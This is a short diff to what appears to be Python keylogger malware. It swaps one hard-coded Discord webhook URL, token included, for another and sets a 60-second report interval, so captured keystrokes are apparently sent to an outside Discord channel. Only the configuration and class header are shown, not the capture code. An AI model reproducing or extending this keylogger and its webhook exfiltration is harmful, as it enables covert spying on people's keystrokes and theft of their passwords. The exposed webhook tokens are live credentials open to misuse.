@@ -6,7 +6,7 @@ from tendo import singleton
 
 me = singleton.SingleInstance()
 SEND_REPORT_EVERY = 60
-WEBHOOK = "https://discord.com/api/webhooks/1081823558570868837/s_U0iGxYVNm56STjfQERpv_UeWt5-sxZLnGqmBI6lAkTaflq83Zc_kO7tcwXuQHIcq1q"
+WEBHOOK = "https://discord.com/api/webhooks/1083893050817925181/RSEF5VsNw2Unu3JQb6SgdoWLZIlJ8ACegeo66MjQCVkWwB4EIis80OoxUDpDZVBOMD_Q"
 
 class Keylogger: 
     def __init__(self, interval, report_method="webhook"):
